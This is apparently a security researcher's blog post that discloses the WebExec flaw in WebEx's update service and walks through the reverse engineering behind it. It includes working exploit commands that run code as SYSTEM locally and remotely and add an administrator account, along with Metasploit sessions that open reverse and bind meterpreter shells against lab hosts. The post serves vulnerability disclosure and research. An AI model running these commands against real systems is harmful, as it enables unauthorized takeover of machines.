---
id: 2340
title: 'Technical Rundown of WebExec'
date: '2018-10-24T11:18:44-05:00'
author: ron
layout: post
guid: 'https://blog.skullsecurity.org/?p=2340'
permalink: /2018/technical-rundown-of-webexec
categories:
    - hacking
    - smb
    - re
---

This is a technical rundown of a vulnerability that we've dubbed "WebExec". The summary is: a flaw in WebEx's WebexUpdateService allows anyone with a login to the Windows system where WebEx is installed to run SYSTEM-level code remotely. That's right: this client-side application that doesn't listen on any ports is actually vulnerable to remote code execution! A local or domain account will work, making this a powerful way to pivot through networks until it's patched.

High level details and FAQ at <a href="https://webexec.org">https://webexec.org</a>! Below is a technical writeup of how we found the bug and how it works.

<!--more-->
<h2>Credit</h2>

This vulnerability was discovered by <a href="https://twitter.com/iagox86">myself</a> and <a href="https://twitter.com/jeffmcjunkin">Jeff McJunkin</a> from <a href="https://www.counterhackchallenges.com/">Counter Hack</a> during a routine pentest. Thanks to <a href="https://twitter.com/edskoudis">Ed Skoudis</a> for permission to post this writeup.

If you have any questions or concerns, I made an email alias specifically for this issue: <a href="mailto:info@webexec.org">info@webexec.org</a>!

You can download a vulnerable installer <a href='https://downloads.skullsecurity.org/webexapp-2018-08-30.msi'>here</a> and a patched one <a href='https://downloads.skullsecurity.org/webexapp-2018-10-03.msi'>here</a>, in case you want to play with this yourself! It probably goes without saying, but be careful if you run the vulnerable version!

<h2>Intro</h2>
During a recent pentest, we found an interesting vulnerability in the WebEx client software while we were trying to escalate local privileges on an end-user laptop. Eventually, we realized that this vulnerability is also exploitable remotely (given any domain user account) and decided to give it a name: WebExec. Because every good vulnerability has a name!

As far as we know, a remote attack against a 3rd party Windows service is a novel type of attack. We're calling the class "thank you for your service", because we can, and are crossing our fingers that more are out there!

The actual version of WebEx is the latest client build as of August, 2018: Version 3211.0.1801.2200, modified 7/19/2018 SHA1: bf8df54e2f49d06b52388332938f5a875c43a5a7. We've tested some older and newer versions since then, and they are still vulnerable.

WebEx released patch on October 3, but requested we maintain embargo until they release their advisory. You can find all the patching instructions on <a href='https://webexec.org/'>webexec.org</a>.

The good news is, the patched version of this service will only run files that are signed by WebEx. The bad news is, there are a lot of those out there (including the vulnerable version of the service!), and the service can still be started remotely. If you're concerned about the service being remotely start-able by any user (which you should be!), the following command disables that function:
<pre>c:\&gt;sc sdset webexservice <span class="rubyConstant">D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPLORC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)</span>
</pre>

That removes remote and non-interactive access from the service. It will still be vulnerable to local privilege escalation, though, without the patch.

<h2>Privilege Escalation</h2>

What initially got our attention is that folder (<tt>c:\ProgramData\WebEx\WebEx\Applications\</tt>) is readable and writable by everyone, and it installs a service called "webexservice" that can be started and stopped by anybody. That's not good! It is trivial to replace the .exe or an associated .dll with anything we like, and get code execution at the service level (that's SYSTEM). That's an immediate vulnerability, which we reported, and which <a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180905-webex-pe">ZDI apparently beat us to the punch on</a>, since it was fixed on September 5, 2018, based on their report.

Due to the application whitelisting, however, on this particular assessment we couldn't simply replace this with a shell! The service starts non-interactively (ie, no window and no commandline arguments). We explored a lot of different options, such as replacing the .exe with other binaries (such as cmd.exe), but no GUI meant no ability to run commands.

One test that <em>almost</em> worked was replacing the .exe with another whitelisted application, <tt>msbuild.exe</tt>, which can read arbitrary C# commands out of a .vbproj file in the same directory. But because it's a service, it runs with the working directory <tt>c:\windows\system32</tt>, and we couldn't write to that folder!

At that point, my curiosity got the best of me, and I decided to look into what <tt>webexservice.exe</tt> actually does under the hood. The deep dive ended up finding gold! Let's take a look

<h2 id="deep-dive">Deep dive into WebExService.exe</h2>

It's not really a good motto, but when in doubt, I tend to open something in IDA. The two easiest ways to figure out what a process does in IDA is the <tt>strings</tt> windows (shift-F12) and the <tt>imports</tt> window. In the case of webexservice.exe, most of the strings were related to Windows service stuff, but something caught my eye:

<pre>  <span class="Statement">.rdata</span>:<span class="Number">0040543</span><span class="Number">8</span> <span class="Comment">; wchar_t aSCreateprocess</span>
  <span class="Statement">.rdata</span>:<span class="Number">0040543</span><span class="Number">8</span> <span class="Identifier">aSCreateprocess</span>:                        <span class="Comment">; DATA XREF: sub_4025A0+1E8o</span>
  <span class="Statement">.rdata</span>:<span class="Number">0040543</span><span class="Number">8</span>                 <span class="Identifier">unicode</span> <span class="Number">0,</span> &lt;%<span class="Identifier">s</span>::<span class="Identifier">CreateProcessAsUser</span>:%<span class="Identifier">d</span><span class="Comment">;%ls;%ls(%d).&gt;,0</span>
</pre>
I found the import for <tt>CreateProcessAsUserW</tt> in advapi32.dll, and looked at how it was called:
<pre>  <span class="Statement">.text</span>:<span class="Number">0040254E</span>                 <span class="Identifier">push</span>    [<span class="Identifier">ebp</span>+<span class="Identifier">lpProcessInformation</span>] <span class="Comment">; lpProcessInformation</span>
  <span class="Statement">.text</span>:<span class="Number">00402554</span>                 <span class="Identifier">push</span>    [<span class="Identifier">ebp</span>+<span class="Identifier">lpStartupInfo</span>] <span class="Comment">; lpStartupInfo</span>
  <span class="Statement">.text</span>:<span class="Number">0040255A</span>                 <span class="Identifier">push</span>    <span class="Number">0 </span>              <span class="Comment">; lpCurrentDirectory</span>
  <span class="Statement">.text</span>:<span class="Number">0040255C</span>                 <span class="Identifier">push</span>    <span class="Number">0 </span>              <span class="Comment">; lpEnvironment</span>
  <span class="Statement">.text</span>:<span class="Number">0040255E</span>                 <span class="Identifier">push</span>    <span class="Number">0 </span>              <span class="Comment">; dwCreationFlags</span>
  <span class="Statement">.text</span>:<span class="Number">00402560</span>                 <span class="Identifier">push</span>    <span class="Number">0 </span>              <span class="Comment">; bInheritHandles</span>
  <span class="Statement">.text</span>:<span class="Number">00402562</span>                 <span class="Identifier">push</span>    <span class="Number">0 </span>              <span class="Comment">; lpThreadAttributes</span>
  <span class="Statement">.text</span>:<span class="Number">00402564</span>                 <span class="Identifier">push</span>    <span class="Number">0 </span>              <span class="Comment">; lpProcessAttributes</span>
  <span class="Statement">.text</span>:<span class="Number">00402566</span>                 <span class="Identifier">push</span>    [<span class="Identifier">ebp</span>+<span class="Identifier">lpCommandLine</span>] <span class="Comment">; lpCommandLine</span>
  <span class="Statement">.text</span>:<span class="Number">0040256C</span>                 <span class="Identifier">push</span>    <span class="Number">0 </span>              <span class="Comment">; lpApplicationName</span>
  <span class="Statement">.text</span>:<span class="Number">0040256E</span>                 <span class="Identifier">push</span>    [<span class="Identifier">ebp</span>+<span class="Identifier">phNewToken</span>] <span class="Comment">; hToken</span>
  <span class="Statement">.text</span>:<span class="Number">00402574</span>                 <span class="Identifier">call</span>    <span class="Identifier">ds</span>:<span class="Identifier">CreateProcessAsUserW</span>
</pre>

The <tt>W</tt> on the end refers to the UNICODE ("wide") version of the function. When developing Windows code, developers typically use <tt>CreateProcessAsUser</tt> in their code, and the compiler expands it to <tt>CreateProcessAsUserA</tt> for ASCII, and <tt>CreateProcessAsUserW</tt> for UNICODE. If you look up the function definition for <tt>CreateProcessAsUser</tt>, you'll find everything you need to know.

In any case, the two most important arguments here are <tt>hToken</tt> - the user it creates the process as - and <tt>lpCommandLine</tt> - the command that it actually runs. Let's take a look at each!

<h2>hToken</h2>

The code behind <tt>hToken</tt> is actually pretty simple. If we scroll up in the same function that calls <tt>CreateProcessAsUserW</tt>, we can just look at API calls to get a feel for what's going on. Trying to understand what code's doing simply based on the sequence of API calls tends to work fairly well in Windows applications, as you'll see shortly.

At the top of the function, we see:
<pre>  <span class="Statement">.text</span>:<span class="Number">0040241E</span>                 <span class="Identifier">call</span>    <span class="Identifier">ds</span>:<span class="Identifier">CreateToolhelp32Snapshot</span>
</pre>
This is a normal way to search for a specific process in Win32 - it creates a "snapshot" of the running processes and then typically walks through them using <tt>Process32FirstW</tt> and <tt>Process32NextW</tt> until it finds the one it needs. I even used the <a href="https://github.com/iagox86/old-injector/blob/master/Injection.h#L80">exact same technique</a> a long time ago when I wrote my <a href="https://github.com/iagox86/old-injector">Injector</a> tool for loading a custom .dll into another process (sorry for the bad code.. I wrote it like 15 years ago).

Based simply on knowledge of the APIs, we can deduce that it's searching for a specific process. If we keep scrolling down, we can find a call to <tt>_wcsicmp</tt>, which is a Microsoft way of saying <tt>stricmp</tt> for UNICODE strings:
<pre>  <span class="Statement">.text</span>:<span class="Number">004024</span><span class="Number">80</span>                 <span class="Identifier">lea</span>     <span class="Identifier">eax</span>, [<span class="Identifier">ebp</span>+<span class="Identifier">Str1</span>]
  <span class="Statement">.text</span>:<span class="Number">004024</span><span class="Number">86</span>                 <span class="Identifier">push</span>    <span class="Identifier">offset</span> <span class="Identifier">Str2</span>     <span class="Comment">; "winlogon.exe"</span>
  <span class="Statement">.text</span>:<span class="Number">004024</span><span class="Number">8B</span>                 <span class="Identifier">push</span>    <span class="Identifier">eax</span>             <span class="Comment">; Str1</span>
  <span class="Statement">.text</span>:<span class="Number">004024</span><span class="Number">8C</span>                 <span class="Identifier">call</span>    <span class="Identifier">ds</span>:<span class="Identifier">_wcsicmp</span>
  <span class="Statement">.text</span>:<span class="Number">004024</span><span class="Number">92</span>                 <span class="Identifier">add</span>     <span class="Identifier">esp</span>, <span class="Number">8</span>
  <span class="Statement">.text</span>:<span class="Number">004024</span><span class="Number">95</span>                 <span class="Identifier">test</span>    <span class="Identifier">eax</span>, <span class="Identifier">eax</span>
  <span class="Statement">.text</span>:<span class="Number">004024</span><span class="Number">97</span>                 <span class="Identifier">jnz</span>     <span class="Identifier">short</span> <span class="Identifier">loc_4024BE</span>
</pre>
Specifically, it's comparing the name of each process to "winlogon.exe" - so it's trying to get a handle to the "winlogon.exe" process!

If we continue down the function, you'll see that it calls <tt>OpenProcess</tt>, then <tt>OpenProcessToken</tt>, then <tt>DuplicateTokenEx</tt>. That's another common sequence of API calls - it's how a process can get a handle to another process's token. Shortly after, the token it duplicates is passed to <tt>CreateProcessAsUserW</tt> as hToken.

To summarize: this function gets a handle to <tt>winlogon.exe</tt>, duplicates its token, and creates a new process as the same user (<tt>SYSTEM</tt>). Now all we need to do is figure out what the process is!

An interesting takeaway here is that I didn't really really read assembly at all to determine any of this: I simply followed the API calls. Often, reversing Windows applications is just that easy!
<h2 id="lpcommandline">lpCommandLine</h2>
This is where things get a little more complicated, since there are a series of function calls to traverse to figure out lpCommandLine. I had to use a combination of reversing, debugging, troubleshooting, and eventlogs to figure out exactly where <tt>lpCommandLine</tt> comes from. This took a good full day, so don't be discouraged by this quick summary - I'm skipping an awful lot of dead ends and validation to keep just to the interesting bits.

One such dead end: I initially started by working backwards from <tt>CreateProcessAsUserW</tt>, or forwards from <tt>main()</tt>, but I quickly became lost in the weeds and decided that I'd have to go the other route. While scrolling around, however, I noticed a lot of debug strings and calls to the event log. That gave me an idea - I opened the Windows event viewer (<tt>eventvwr.msc</tt>) and tried to start the process with <tt>sc start webexservice</tt>:
<pre><span class="rubyConstant">C</span>:\<span class="rubyConstant">Users</span>\ron&gt;sc start webexservice

<span class="rubySymbol">SERVICE_NAME</span>: webexservice
        <span class="rubyConstant">TYPE</span>               : <span class="Number">10</span>  <span class="rubyConstant">WIN32_OWN_PROCESS</span>
        <span class="rubyConstant">STATE</span>              : <span class="Number">2</span>  <span class="rubyConstant">START_PENDING</span>
                                (<span class="rubyConstant">NOT_STOPPABLE</span>, <span class="rubyConstant">NOT_PAUSABLE</span>, <span class="rubyConstant">IGNORES_SHUTDOWN</span>)
[...]
</pre>
You may need to configure Event Viewer to show everything in the Application logs, I didn't really know what I was doing, but eventually I found a log entry for WebExService.exe:
<pre>  ExecuteServiceCommand::Not enough command line arguments to execute a service command.
</pre>
That's handy! Let's search for that in IDA (alt+T)! That leads us to this code:
<pre>  <span class="Statement">.text</span>:<span class="Number">004027DC</span>                 <span class="Identifier">cmp</span>     <span class="Identifier">edi</span>, <span class="Number">3</span>
  <span class="Statement">.text</span>:<span class="Number">004027DF</span>                 <span class="Identifier">jge</span>     <span class="Identifier">short</span> <span class="Identifier">loc_4027FD</span>
  <span class="Statement">.text</span>:<span class="Number">004027E1</span>                 <span class="Identifier">push</span>    <span class="Identifier">offset</span> <span class="Identifier">aExecuteservice</span> <span class="Comment">; &amp;quot;ExecuteServiceCommand&amp;quot;</span>
  <span class="Statement">.text</span>:<span class="Number">004027E6</span>                 <span class="Identifier">push</span>    <span class="Identifier">offset</span> <span class="Identifier">aSNotEnoughComm</span> <span class="Comment">; &amp;quot;%s::Not enough command line arguments t&amp;quot;...</span>
  <span class="Statement">.text</span>:<span class="Number">004027EB</span>                 <span class="Identifier">push</span>    <span class="Number">2</span>               <span class="Comment">; wType</span>
  <span class="Statement">.text</span>:<span class="Number">004027ED</span>                 <span class="Identifier">call</span>    <span class="Identifier">sub_401770</span>
</pre>
A tiny bit of actual reversing: compare <tt>edit</tt> to 3, jump if greater or equal, otherwise print that we need more commandline arguments. It doesn't take a huge logical leap to determine that we need 2 or more commandline arguments (since the name of the process is always counted as well). Let's try it:
<pre><span class="rubyConstant">C</span>:\<span class="rubyConstant">Users</span>\ron&gt;sc start webexservice a b

[...]
</pre>
Then check Event Viewer again:
<pre>  ExecuteServiceCommand::Service command not recognized: b.
</pre>
Don't you love verbose error messages? It's like we don't even have to think! Once again, search for that string in IDA (alt+T) and we find ourselves here:
<pre>  <span class="Statement">.text</span>:<span class="Number">00402</span><span class="Number">830</span> <span class="Identifier">loc_402830</span>:                             <span class="Comment">; CODE XREF: sub_4027D0+3Dj</span>
  <span class="Statement">.text</span>:<span class="Number">00402</span><span class="Number">830</span>                 <span class="Identifier">push</span>    <span class="Identifier">dword</span> <span class="Identifier">ptr</span> [<span class="Identifier">esi</span>+<span class="Number">8</span>]
  <span class="Statement">.text</span>:<span class="Number">00402</span><span class="Number">833</span>                 <span class="Identifier">push</span>    <span class="Identifier">offset</span> <span class="Identifier">aExecuteservice</span> <span class="Comment">; "ExecuteServiceCommand"</span>
  <span class="Statement">.text</span>:<span class="Number">00402</span><span class="Number">838</span>                 <span class="Identifier">push</span>    <span class="Identifier">offset</span> <span class="Identifier">aSServiceComman</span> <span class="Comment">; "%s::Service command not recognized: %ls"...</span>
  <span class="Statement">.text</span>:<span class="Number">00402</span><span class="Number">83D</span>                 <span class="Identifier">push</span>    <span class="Number">2</span>               <span class="Comment">; wType</span>
  <span class="Statement">.text</span>:<span class="Number">00402</span><span class="Number">83F</span>                 <span class="Identifier">call</span>    <span class="Identifier">sub_401770</span>
</pre>
If we scroll up just a bit to determine how we get to that error message, we find this:
<pre>  <span class="Statement">.text</span>:<span class="Number">004027FD</span> <span class="Identifier">loc_4027FD</span>:                             <span class="Comment">; CODE XREF: sub_4027D0+Fj</span>
  <span class="Statement">.text</span>:<span class="Number">004027FD</span>                 <span class="Identifier">push</span>    <span class="Identifier">offset</span> <span class="Identifier">aSoftwareUpdate</span> <span class="Comment">; "software-update"</span>
  <span class="Statement">.text</span>:<span class="Number">00402</span><span class="Number">802</span>                 <span class="Identifier">push</span>    <span class="Identifier">dword</span> <span class="Identifier">ptr</span> [<span class="Identifier">esi</span>+<span class="Number">8</span>] <span class="Comment">; lpString1</span>
  <span class="Statement">.text</span>:<span class="Number">00402</span><span class="Number">805</span>                 <span class="Identifier">call</span>    <span class="Identifier">ds</span>:<span class="Identifier">lstrcmpiW</span>
  <span class="Statement">.text</span>:<span class="Number">00402</span><span class="Number">80B</span>                 <span class="Identifier">test</span>    <span class="Identifier">eax</span>, <span class="Identifier">eax</span>
  <span class="Statement">.text</span>:<span class="Number">00402</span><span class="Number">80D</span>                 <span class="Identifier">jnz</span>     <span class="Identifier">short</span> <span class="Identifier">loc_402830</span> <span class="Comment">; &lt;-- Jumps to the error we saw</span>
  <span class="Statement">.text</span>:<span class="Number">00402</span><span class="Number">80F</span>                 <span class="Identifier">mov</span>     [<span class="Identifier">ebp</span>+<span class="Identifier">var_4</span>], <span class="Identifier">eax</span>
  <span class="Statement">.text</span>:<span class="Number">00402</span><span class="Number">812</span>                 <span class="Identifier">lea</span>     <span class="Identifier">edx</span>, [<span class="Identifier">esi</span>+0<span class="Identifier">Ch</span>]
  <span class="Statement">.text</span>:<span class="Number">00402</span><span class="Number">815</span>                 <span class="Identifier">lea</span>     <span class="Identifier">eax</span>, [<span class="Identifier">ebp</span>+<span class="Identifier">var_4</span>]
  <span class="Statement">.text</span>:<span class="Number">00402</span><span class="Number">818</span>                 <span class="Identifier">push</span>    <span class="Identifier">eax</span>
  <span class="Statement">.text</span>:<span class="Number">00402</span><span class="Number">819</span>                 <span class="Identifier">push</span>    <span class="Identifier">ecx</span>
  <span class="Statement">.text</span>:<span class="Number">00402</span><span class="Number">81A</span>                 <span class="Identifier">lea</span>     <span class="Identifier">ecx</span>, [<span class="Identifier">edi</span>-<span class="Number">3</span>]
  <span class="Statement">.text</span>:<span class="Number">00402</span><span class="Number">81D</span>                 <span class="Identifier">call</span>    <span class="Identifier">sub_4025A0</span>
</pre>
The string <tt>software-update</tt> is what the string is compared to. So instead of <tt>b</tt>, let's try <tt>software-update</tt> and see if that gets us further! I want to once again point out that we're only doing an absolutely minimum amount of reverse engineering at the assembly level - we're basically entirely using API calls and error messages!

Here's our new command:
<pre><span class="rubyConstant">C</span>:\<span class="rubyConstant">Users</span>\ron&gt;sc start webexservice a software-update

[...]
</pre>
Which results in the new log entry:
<pre>  Faulting application name: WebExService.exe, version: 3211.0.1801.2200, time stamp: 0x5b514fe3
  Faulting module name: WebExService.exe, version: 3211.0.1801.2200, time stamp: 0x5b514fe3
  Exception code: 0xc0000005
  Fault offset: 0x00002643
  Faulting process id: 0x654
  Faulting application start time: 0x01d42dbbf2bcc9b8
  Faulting application path: C:\ProgramData\Webex\Webex\Applications\WebExService.exe
  Faulting module path: C:\ProgramData\Webex\Webex\Applications\WebExService.exe
  Report Id: 31555e60-99af-11e8-8391-0800271677bd
</pre>
Uh oh! I'm normally excited when I get a process to crash, but this time I'm actually trying to use its features! What do we do!?

First of all, we can look at the exception code: 0xc0000005. If you Google it, or develop low-level software, you'll know that it's a memory fault. The process tried to access a bad memory address (likely NULL, though I never verified).

The first thing I tried was the brute-force approach: let's add more commandline arguments! My logic was that it might require 2 arguments, but actually use the third and onwards for something then crash when they aren't present.

So I started the service with the following commandline:
<pre><span class="rubyConstant">C</span>:\<span class="rubyConstant">Users</span>\ron&gt;sc start webexservice a software-update a b c d e f

[...]
</pre>
That led to a new crash, so progress!
<pre>  Faulting application name: WebExService.exe, version: 3211.0.1801.2200, time stamp: 0x5b514fe3
  Faulting module name: MSVCR120.dll, version: 12.0.21005.1, time stamp: 0x524f7ce6
  Exception code: 0x40000015
  Fault offset: 0x000a7676
  Faulting process id: 0x774
  Faulting application start time: 0x01d42dbc22eef30e
  Faulting application path: C:\ProgramData\Webex\Webex\Applications\WebExService.exe
  Faulting module path: C:\ProgramData\Webex\Webex\Applications\MSVCR120.dll
  Report Id: 60a0439c-99af-11e8-8391-0800271677bd
</pre>
I had to google <tt>0x40000015</tt>; it means <tt>STATUS_FATAL_APP_EXIT</tt>. In other words, the app exited, but hard - probably a failed <tt>assert()</tt>? We don't really have any output, so it's hard to say.

This one took me awhile, and this is where I'll skip the deadends and debugging and show you what worked.

Basically, keep following the codepath immediately after the <tt>software-update</tt> string we saw earlier. Not too far after, you'll see this function call:

<pre>  <span class="Statement">.text</span>:<span class="Number">00402</span><span class="Number">81D</span>                 <span class="Identifier">call</span>    <span class="Identifier">sub_4025A0</span>
</pre>
If you jump into that function (double click), and scroll down a bit, you'll see:
<pre>  <span class="Statement">.text</span>:<span class="Number">00402616</span>                 <span class="Identifier">mov</span>     [<span class="Identifier">esp</span>+<span class="Number">0B</span><span class="Number">4h</span>+<span class="Identifier">var_70</span>], <span class="Identifier">offset</span> <span class="Identifier">aWinsta0Default</span> <span class="Comment">; "winsta0\\Default"</span>
</pre>
I used the most advanced technique in my arsenal here and googled that string. It turns out that it's a handle to the default desktop and is frequently used when starting a new process that needs to interact with the user. That's a great sign, it means we're almost there!

A little bit after, in the same function, we see this code:

<pre>  <span class="Statement">.text</span>:<span class="Number">004026A2</span>                 <span class="Identifier">push</span>    <span class="Identifier">eax</span>             <span class="Comment">; EndPtr</span>
  <span class="Statement">.text</span>:<span class="Number">004026A3</span>                 <span class="Identifier">push</span>    <span class="Identifier">esi</span>             <span class="Comment">; Str</span>
  <span class="Statement">.text</span>:<span class="Number">004026A4</span>                 <span class="Identifier">call</span>    <span class="Identifier">ds</span>:<span class="Identifier">wcstod</span> <span class="Comment">; &lt;--</span>
  <span class="Statement">.text</span>:<span class="Number">004026AA</span>                 <span class="Identifier">add</span>     <span class="Identifier">esp</span>, <span class="Number">8</span>
  <span class="Statement">.text</span>:<span class="Number">004026AD</span>                 <span class="Identifier">fstp</span>    [<span class="Identifier">esp</span>+<span class="Number">0B</span><span class="Number">4h</span>+<span class="Identifier">var_90</span>]
  <span class="Statement">.text</span>:<span class="Number">004026B1</span>                 <span class="Identifier">cmp</span>     <span class="Identifier">esi</span>, [<span class="Identifier">esp</span>+<span class="Number">0B</span><span class="Number">4h</span>+<span class="Identifier">EndPtr</span>+<span class="Number">4</span>]
  <span class="Statement">.text</span>:<span class="Number">004026B5</span>                 <span class="Identifier">jnz</span>     <span class="Identifier">short</span> <span class="Identifier">loc_4026C2</span>
  <span class="Statement">.text</span>:<span class="Number">004026B7</span>                 <span class="Identifier">push</span>    <span class="Identifier">offset</span> <span class="Identifier">aInvalidStodArg</span> <span class="Comment">; &amp;quot;invalid stod argument&amp;quot;</span>
  <span class="Statement">.text</span>:<span class="Number">004026BC</span>                 <span class="Identifier">call</span>    <span class="Identifier">ds</span>:?<span class="Identifier">_Xinvalid_argument</span>@<span class="Identifier">std</span>@@<span class="Identifier">YAXPBD</span>@<span class="Identifier">Z</span> <span class="Comment">; std::_Xinvalid_argument(char const *)</span>
</pre>
The line with an error - <tt>wcstod()</tt> is close to where the <tt>abort()</tt> happened. I'll spare you the debugging details - debugging a service was non-trivial - but I really should have seen that function call before I got off track.

I looked up <tt>wcstod()</tt> online, and it's another of Microsoft's cleverly named functions. This one converts a string to a number. If it fails, the code references something called <tt>std::_Xinvalid_argument</tt>. I don't know exactly what it does from there, but we can assume that it's looking for a number somewhere.

This is where my advice becomes "be lucky". The reason is, the only number that will actually work here is "1". I don't know why, or what other numbers do, but I ended up calling the service with the commandline:
<pre><span class="rubyConstant">C</span>:\<span class="rubyConstant">Users</span>\ron&gt;sc start webexservice a software-update <span class="Number">1</span> <span class="Number">2</span> <span class="Number">3</span> <span class="Number">4</span> <span class="Number">5</span> <span class="Number">6</span>
</pre>
And checked the event log:
<pre>  StartUpdateProcess::CreateProcessAsUser:1;1;2 3 4 5 6(18).
</pre>
That looks awfully promising! I changed <tt>2</tt> to an actual process:
<pre>  <span class="rubyConstant">C</span>:\<span class="rubyConstant">Users</span>\ron&gt;sc start webexservice a software-update <span class="Number">1</span> calc c d e f
</pre>
And it opened!
<pre><span class="rubyConstant">C</span>:\<span class="rubyConstant">Users</span>\ron&gt;tasklist | find <span class="rubyStringDelimiter">"</span><span class="String">calc</span><span class="rubyStringDelimiter">"</span>
calc.exe                      <span class="Number">1476</span> <span class="rubyConstant">Console</span>                    <span class="Number">1</span>     <span class="Number">10</span>,<span class="Number">804</span> <span class="rubyConstant">K</span>
</pre>
It actually runs with a GUI, too, so that's kind of unnecessary. I could literally see it! And it's running as <tt>SYSTEM</tt>!

Speaking of unknowns, running <tt>cmd.exe</tt> and <tt>powershell</tt> the same way does not appear to work. We can, however, run <tt>wmic.exe</tt> and <tt>net.exe</tt>, so we have some choices!

<h2>Local exploit</h2>

The simplest exploit is to start <tt>cmd.exe</tt> with <tt>wmic.exe</tt>:
<pre><span class="rubyConstant">C</span>:\<span class="rubyConstant">Users</span>\ron&gt;sc start webexservice a software-update <span class="Number">1</span> wmic process call create <span class="rubyStringDelimiter">"</span><span class="String">cmd.exe</span><span class="rubyStringDelimiter">"</span>
</pre>
That opens a GUI <tt>cmd.exe</tt> instance as <tt>SYSTEM</tt>:
<pre>Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32&gt;whoami
nt authority\system
</pre>
If we can't or choose not to open a GUI, we can also escalate privileges:
<pre>C:\Users\ron&gt;net localgroup administrators
[...]
Administrator
ron

C:\Users\ron&gt;sc start webexservice a software-update 1 net localgroup administrators testuser /add
[...]

C:\Users\ron&gt;net localgroup administrators
[...]
Administrator
ron
testuser
</pre>

And this all works as an unprivileged user!

Jeff wrote a <a href="https://github.com/iagox86/metasploit-framework-webexec/blob/master/modules/exploits/windows/local/webexec.rb">local module for Metasploit</a> to exploit the privilege escalation vulnerability. If you have a non-SYSTEM session on the affected machine, you can use it to gain a SYSTEM account:

<pre>
meterpreter &gt; getuid
Server username: IEWIN7\IEUser

meterpreter &gt; background
[*] Backgrounding session 2...

msf exploit(multi/handler) &gt; use exploit/windows/local/webexec
msf exploit(windows/local/webexec) &gt; set SESSION 2
SESSION =&gt; 2

msf exploit(windows/local/webexec) &gt; set payload windows/meterpreter/reverse_tcp
msf exploit(windows/local/webexec) &gt; set LHOST 172.16.222.1
msf exploit(windows/local/webexec) &gt; set LPORT 9001
msf exploit(windows/local/webexec) &gt; run

[*] Started reverse TCP handler on 172.16.222.1:9001
[*] Checking service exists...
[*] Writing 73802 bytes to %SystemRoot%\Temp\yqaKLvdn.exe...
[*] Launching service...
[*] Sending stage (179779 bytes) to 172.16.222.132
[*] Meterpreter session 2 opened (172.16.222.1:9001 -&gt; 172.16.222.132:49574) at 2018-08-31 14:45:25 -0700
[*] Service started...

meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
</pre>

<h2>Remote exploit</h2>

We actually spent over a week knowing about this vulnerability without realizing that it could be used remotely! The simplest exploit can still be done with the Windows <tt>sc</tt> command. Either create a session to the remote machine or create a local user with the same credentials, then run <tt>cmd.exe</tt> in the context of that user (<tt>runas /user:newuser cmd.exe</tt>). Once that's done, you can use the exact same command against the remote host:
<pre>c:\&gt;sc \\10.0.0.0 start webexservice a software-update 1 net localgroup administrators testuser /add
</pre>
The command will run (and a GUI will even pop up!) on the other machine.

<h2>Remote exploitation with Metasploit</h2>

To simplify this attack, I wrote a pair of Metasploit modules. <a href="https://github.com/iagox86/metasploit-framework-webexec/blob/master/lib/msf/core/exploit/smb/client/webexec.rb">One is an auxiliary module</a> that implements this attack to run an arbitrary command remotely, and <a href="https://github.com/iagox86/metasploit-framework-webexec/blob/master/modules/exploits/windows/smb/webexec.rb">the other is a full exploit module</a>. Both require a valid SMB account (local or domain), and both mostly depend on the <a href="https://github.com/CounterHack/webexec-metasploit/blob/cisco-webex-exploit/lib/msf/core/exploit/smb/client/webexec.rb">WebExec library</a> that I wrote.

Here is an example of using the auxiliary module to run <tt>calc</tt> on a bunch of vulnerable machines:

<pre>
msf5 &gt; use auxiliary/admin/smb/webexec_command
msf5 auxiliary(admin/smb/webexec_command) &gt; set RHOSTS 192.168.1.100-110
RHOSTS =&gt; 192.168.56.100-110
msf5 auxiliary(admin/smb/webexec_command) &gt; set SMBUser testuser
SMBUser =&gt; testuser
msf5 auxiliary(admin/smb/webexec_command) &gt; set SMBPass testuser
SMBPass =&gt; testuser
msf5 auxiliary(admin/smb/webexec_command) &gt; set COMMAND calc
COMMAND =&gt; calc
msf5 auxiliary(admin/smb/webexec_command) &gt; exploit

[-] 192.168.56.105:445    - No service handle retrieved
[+] 192.168.56.105:445    - Command completed!
[-] 192.168.56.103:445    - No service handle retrieved
[+] 192.168.56.103:445    - Command completed!
[+] 192.168.56.104:445    - Command completed!
[+] 192.168.56.101:445    - Command completed!
[*] 192.168.56.100-110:445 - Scanned 11 of 11 hosts (100% complete)
[*] Auxiliary module execution completed
</pre>

And here's the full exploit module:

<pre>
msf5 &gt; use exploit/windows/smb/webexec
msf5 exploit(windows/smb/webexec) &gt; set SMBUser testuser
SMBUser =&gt; testuser
msf5 exploit(windows/smb/webexec) &gt; set SMBPass testuser
SMBPass =&gt; testuser
msf5 exploit(windows/smb/webexec) &gt; set PAYLOAD windows/meterpreter/bind_tcp
PAYLOAD =&gt; windows/meterpreter/bind_tcp
msf5 exploit(windows/smb/webexec) &gt; set RHOSTS 192.168.56.101
RHOSTS =&gt; 192.168.56.101
msf5 exploit(windows/smb/webexec) &gt; exploit

[*] 192.168.56.101:445 - Connecting to the server...
[*] 192.168.56.101:445 - Authenticating to 192.168.56.101:445 as user 'testuser'...
[*] 192.168.56.101:445 - Command Stager progress -   0.96% done (999/104435 bytes)
[*] 192.168.56.101:445 - Command Stager progress -   1.91% done (1998/104435 bytes)
...
[*] 192.168.56.101:445 - Command Stager progress -  98.52% done (102891/104435 bytes)
[*] 192.168.56.101:445 - Command Stager progress -  99.47% done (103880/104435 bytes)
[*] 192.168.56.101:445 - Command Stager progress - 100.00% done (104435/104435 bytes)
[*] Started bind TCP handler against 192.168.56.101:4444
[*] Sending stage (179779 bytes) to 192.168.56.101
</pre>

The actual implementation is mostly straight forward if you look at the code linked above, but I wanted to specifically talk about the exploit module, since it had an interesting problem: how do you initially get a meterpreter .exe uploaded to execute it?

I started by using a psexec-like exploit where we upload the .exe file to a writable share, then execute it via WebExec. That proved problematic, because uploading to a share frequently requires administrator privileges, and at that point you could simply use <tt>psexec</tt> instead. You lose the magic of WebExec!

